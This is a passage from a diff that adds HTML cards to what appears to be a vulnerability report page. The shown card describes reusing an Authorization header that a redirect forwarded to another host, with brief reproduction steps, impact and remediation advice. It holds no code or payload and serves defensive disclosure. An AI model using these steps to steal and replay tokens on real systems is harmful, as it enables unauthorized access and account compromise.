+<li>Attempt to reuse the captured token to access a protected resource on a different host.</li>
+<li>Verify that the attacker can successfully access the protected resource using the stolen token.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can steal authorization tokens from an initial request and reuse them to gain unauthorized access to protected resources, potentially leading to data breaches, account compromise, or privilege escalation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> When handling redirects, ensure that sensitive headers, such as <code>Authorization</code>, are not reapplied or forwarded when the redirect targets a different host. Implement strict validation and sanitization of redirect targets to prevent malicious redirects.  Consider using separate request objects for redirected requests to avoid inheriting sensitive data from the original request.</p>
+      </div>
+    </article>
+    
+
     <article class="card" data-category="Network">
       <button type="button" class="card-toggle">
         <span class="card-title">
